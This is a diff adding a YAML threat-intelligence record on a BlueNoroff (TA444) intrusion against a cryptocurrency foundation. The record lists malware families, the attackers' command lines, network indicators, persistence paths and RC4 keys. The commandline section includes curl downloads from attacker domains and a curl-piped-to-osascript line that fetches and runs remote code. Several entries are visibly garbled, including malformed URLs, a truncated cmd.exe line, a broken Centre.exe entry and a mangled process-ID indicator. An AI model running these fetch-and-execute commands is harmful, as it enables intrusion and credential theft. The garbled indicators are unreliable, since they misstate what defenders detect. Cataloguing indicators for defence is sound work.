@@ -1,0 +1,99 @@
+description: Huntress investigated an intrusion targeting a cryptocurrency foundation,
+  attributed to TA444 (BlueNoroff). The initial access vector involved a fake Zoom
+  extension delivered via Telegram and Calendly redirects.
+attribution: TA444 aka BlueNoroff, Sapphire Sleet, COPERNICIUM, STARDUST CHOLLIMA,
+  or CageyChameleona
+malware_families:
+- Telegram 2
+- Root Troy V4 (remoted)
+- InjectWithDyld (a)
+- Base App
+- Payload
+- XScreen (keyboardd)
+- CryptoBot (airmond)
+- NetChk
+- CobaltStrike
+authors:
+- Alden Schmidt
+- Stuart Ashenbrenner
+- Jonathan Semon
+TTPs:
+  processes:
+  - zoom_sdk_support.scpt
+  - /bin/bash
+  - /usr/bin/true
+  - softwareupdate
+  - curl
+  - osascript
+  - zsh
+  - remoted
+  - Telegram 2
+  - cmd.exe
+  - powershell.exe
+  - Centre.exe
+  commandline:
+  - curl -L -k "https://support.us05web-zoom.biz/842799/check"
+  - touch /Users/Shared/.pwd
+  - rm -rf /Users/Shared/.pwd && curl -o "/tmp/icloud_helper" -A curl-mac -s "hxxps://lweb@71zoom.us/fix/audio-fv/7217417464"
+  - chmod +x /tmp/icloud_helper
+  - osascript > /dev/null 2>&1
+  - curl -A curl-mac -s "hxxpl://lweb71zoom.lus/fix/audio-tr/7217417464" | osascript
+    > /dev/null 2>&1
+  - ./cloudkit
+  - ./a gift123$%^
+  - 'cmd.exe /Q /Rule Name: - MavCobaltStrikeRunningProce'
+  - powershell.exe
+  - Centre.exe C:\\Users\\Public\\Downloads\\Centre.exe %]
+  powershell: []
+  scripting_engine:
+  - AppleScript
+  - Bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl
+    destination_address: support.us05web-zoom.biz
+    port: ''
+    url: https://support.us05web-zoom.biz/842799/check
+  - executable: curl
+    destination_address: lweb@71zoom.us
+    port: ''
+    url: hxxps://lweb@71zoom.us/fix/audio-fv/7217417464
+  - executable: curl
+    destination_address: lweb71zoom.lus
+    port: ''
+    url: hxxpl://lweb71zoom.lus/fix/audio-tr/7217417464
+  - executable: remoted
+    destination_address: productnews.online
+    port: ''
+    url: http://productnews.online/update
+  file_activity:
+  - /Users/Shared/.pwd
+  - /tmp/icloud_helper
+  - /Library/LaunchDaemons/com.telegram2.update.agent.plist
+  - /Library/Application Support/Frameworks/Telegram 2
+  - /private/var/tmp/cfg
+  - /Library/Google/Cache/.cfg
+  - /Library/Google/Cache/.version
+  - /Library/WebServer/bin/remoted
+  - /Users/Shared/._cfg
+  - C:\\Users\\Public\\Downloads\\Centre.exe
+  persistence:
+  - plist file at /Library/LaunchDaemons/com.telegram2.update.agent.plist
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: ''
+- ip: ''
+- domain: support.us05web-zoom.biz
+- url: https://support.us05web-zoom.biz/842799/check
+- url: hxxps://lweb@71zoom.us/fix/audio-fv/7217417464
+- url: hxxpl://lweb71zoom.lus/fix/audio-tr/7217417464
+- domain: productnews.online
+- url: http://productnews.online/update
+- rc4_key: 3DD226D0B700F33974F409142DEFB62A8CD172AE5F2EB9BEB7F5750EB1702E2A
+- rc4_key: C4DB903322D17C8CBF1D1DB55124854C0B070D6ECE54162B6A4D06DF24C572DF
+- bePid:12900:500455277210Process:_pid:12900,ProcessStart:13 3982211264
+reference: https://www.huntress.com/blog/inside-bluenoroff-web3-intrusion-analysis
+date_of_publication: June 23, 2025
+file_creation_date: June 23, 2025
